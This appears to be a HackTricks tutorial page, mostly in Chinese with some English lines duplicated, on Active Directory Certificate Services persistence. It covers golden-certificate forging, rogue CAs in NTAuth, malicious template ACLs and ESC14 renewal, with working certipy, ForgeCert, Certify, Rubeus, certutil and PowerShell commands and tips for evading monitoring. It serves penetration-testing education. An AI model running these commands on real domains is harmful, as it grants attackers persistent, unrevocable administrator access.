# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**这是对 [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) 中共享的域持久性技术的摘要。详见该文档。**

## 使用被盗 CA 证书伪造证书 (Golden Certificate) - DPERSIST1

How can you tell that a certificate is a CA certificate?

如何判断证书是否为 CA 证书？

It can be determined that a certificate is a CA certificate if several conditions are met:

如果满足以下条件，则可以判断该证书为 CA 证书：

- The certificate is stored on the CA server, with its private key secured by the machine's DPAPI, or by hardware such as a TPM/HSM if the operating system supports it.
- 该证书存储在 CA 服务器上，其私钥由机器的 DPAPI 保护，或在操作系统支持的情况下由 TPM/HSM 等硬件保护。
- Both the Issuer and Subject fields of the certificate match the distinguished name of the CA.
- 证书的 Issuer 和 Subject 字段均与 CA 的 distinguished name（可分辨名称）相匹配。
- A "CA Version" extension is present in the CA certificates exclusively.
- CA 证书中专有地存在一个 “CA Version” 扩展。
- The certificate lacks Extended Key Usage (EKU) fields.
- 证书缺少 Extended Key Usage (EKU) 字段。

To extract the private key of this certificate, the `certsrv.msc` tool on the CA server is the supported method via the built-in GUI. Nonetheless, this certificate does not differ from others stored within the system; thus, methods such as the [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) can be applied for extraction.

要提取该证书的私钥，支持的方式是在 CA 服务器上通过内置 GUI 使用 `certsrv.msc` 工具。尽管如此，该证书与系统中存储的其他证书并无差别；因此也可以使用例如 [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) 的方法进行提取。

The certificate and private key can also be obtained using Certipy with the following command:

该证书和私钥也可以使用 Certipy 通过以下命令获取：
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
在获取 CA certificate 及其以 `.pfx` 格式保存的私钥后，可以使用诸如 [ForgeCert](https://github.com/GhostPack/ForgeCert) 的工具来生成有效证书：
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 针对证书伪造的目标用户必须在 Active Directory 中处于活跃状态并能够进行身份验证，过程才能成功。对像 krbtgt 这样的特殊帐户伪造证书无效。

该伪造证书将在指定的结束日期之前以及在**根 CA 证书仍然有效**期间保持**有效**（通常为 5 年到 **10+ 年**）。它也适用于**计算机**，因此结合 **S4U2Self**，攻击者可以在 CA 证书有效期间**在任意域内机器上维持持久性**。\
此外，使用此方法生成的**证书无法撤销**，因为 CA 并不知晓它们。

### 在 Strong Certificate Mapping Enforcement (2025+) 下操作

自 2025 年 2 月 11 日（在 KB5014754 推出之后），域控制器对证书映射的默认设置为 **Full Enforcement**。实际上，这意味着你的伪造证书必须满足以下其中之一：

- 包含与目标帐户的强绑定（例如，SID security extension），或
- 与目标对象的 `altSecurityIdentities` 属性上的强且显式的映射配对。

一种可靠的持久化方法是铸造一个由被窃取的 Enterprise CA 链接的伪造证书，然后为受害主体添加一个强且显式的映射：
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
注意
- 如果你能制作包含 SID 安全扩展的伪造证书，这些证书即使在 Full Enforcement 下也会隐式映射。否则，优先使用显式的强映射。有关显式映射的更多信息，请参见 [account-persistence](account-persistence.md)。
- 撤销机制在这里对防御者没有帮助：伪造证书在 CA 数据库中是未知的，因此无法被撤销。

#### Full-Enforcement compatible forging (SID-aware)

更新的工具允许你直接嵌入 SID，从而在 DCs 拒绝弱映射时仍能保持 golden certificates 可用：
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
通过嵌入 SID，你可以避免触及 `altSecurityIdentities`，该属性可能会被监控，同时仍能满足严格的映射检查。

## 信任流氓 CA 证书 - DPERSIST2

`NTAuthCertificates` 对象被定义为在其 `cacertificate` 属性中包含一个或多个 **CA certificates**，Active Directory (AD) 使用该属性。**域控制器** 的验证过程会检查 `NTAuthCertificates` 对象，查找与正在验证的 **certificate** 的 Issuer 字段中指定的 **CA** 相匹配的条目。如果找到匹配项，则继续进行身份验证。

如果攻击者能够控制该 AD 对象，就可以向 `NTAuthCertificates` 对象添加自签名 CA 证书。通常，只有 **Enterprise Admin** 组的成员，以及位于 **forest root’s domain** 的 **Domain Admins** 或 **Administrators**，才被授予修改此对象的权限。他们可以使用 `certutil.exe` 通过命令 `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` 编辑 `NTAuthCertificates` 对象，或使用 [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)。

对此技术有用的其他命令：
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
当与之前概述的涉及 ForgeCert 来动态生成证书的方法结合使用时，此能力尤其重要。

> Post-2025 映射注意：将一个流氓 CA 放入 NTAuth 只建立了对颁发 CA 的信任。要在 DC 处于 **Full Enforcement** 时使用叶证书进行登录，叶证书必须包含 SID 安全扩展，或者目标对象上必须存在强显式映射（例如，在 `altSecurityIdentities` 中的 Issuer+Serial）。见 {{#ref}}account-persistence.md{{#endref}}。

## 恶意错误配置 - DPERSIST3

通过修改 **AD CS** 组件的 **安全描述符** 来实现 **持久性** 的机会很多。在 "[Domain Escalation](domain-escalation.md)" 一节中描述的修改可以被具有提升访问权限的攻击者恶意实施。这包括向下列敏感组件添加“控制权限”（例如，WriteOwner/WriteDACL/等）：

- **CA 服务器的 AD 计算机对象**
- **CA 服务器的 RPC/DCOM 服务**
- 位于 **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 中的任何 **后代 AD 对象或容器**（例如，Certificate Templates container、Certification Authorities container、NTAuthCertificates 对象等）
- **默认或由组织委派控制 AD CS 权限的 AD 组**（例如内置的 Cert Publishers 组及其任何成员）

一个恶意实施的例子可能是：攻击者在域中拥有 **提升的权限**，向默认的 **`User`** 证书模板添加 **`WriteOwner`** 权限，并将自己设为该权限的主体。为利用此权限，攻击者首先会将 **`User`** 模板的所有权更改为自己。接着，将在模板上将 **`mspki-certificate-name-flag`** 设置为 **1** 以启用 **`ENROLLEE_SUPPLIES_SUBJECT`**，允许用户在请求中提供 Subject Alternative Name。随后，攻击者可以使用该 **模板** **enroll**，在替代名称中选择一个 **domain administrator** 名称，并使用获得的证书以 DA 身份进行认证。

攻击者可能为实现长期域持久性设置的实际选项（详见 {{#ref}}domain-escalation.md{{#endref}}，包含完整细节和检测）：

- 允许请求者提供 SAN 的 CA 策略标志（例如启用 `EDITF_ATTRIBUTESUBJECTALTNAME2`）。这使得类似 ESC1 的路径仍可利用。
- 允许颁发具有认证能力证书的模板 DACL 或设置（例如添加 Client Authentication EKU，启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`）。
- 控制 `NTAuthCertificates` 对象或 CA 容器，以便在防御者尝试清理时持续重新引入流氓颁发者。

> [!TIP]
> 在应用 KB5014754 之后的加固环境中，将这些错误配置与显式的强映射（`altSecurityIdentities`）配合，可以确保即使 DC 实施强映射，你颁发或伪造的证书仍可使用。

### 证书续期滥用 (ESC14) 用于持久性

如果你攻破了一个具有认证能力的证书（或 Enrollment Agent 证书），只要颁发模板仍然发布且你的 CA 仍信任颁发者链，你就可以无限期地 **续期它**。续期会保留原有的身份绑定但延长有效期，这会使驱逐变得困难，除非修复模板或重新发布 CA。
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
如果域控制器处于 **完全强制**，请添加 `-sid <victim SID>`（或使用仍包含 SID 安全扩展的模板），以便续订的叶证书在不修改 `altSecurityIdentities` 的情况下仍然能够进行强映射。具有 CA 管理权限的攻击者也可能调整 `policy\RenewalValidityPeriodUnits`，在为自己签发证书之前延长续订后的有效期。

## References

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
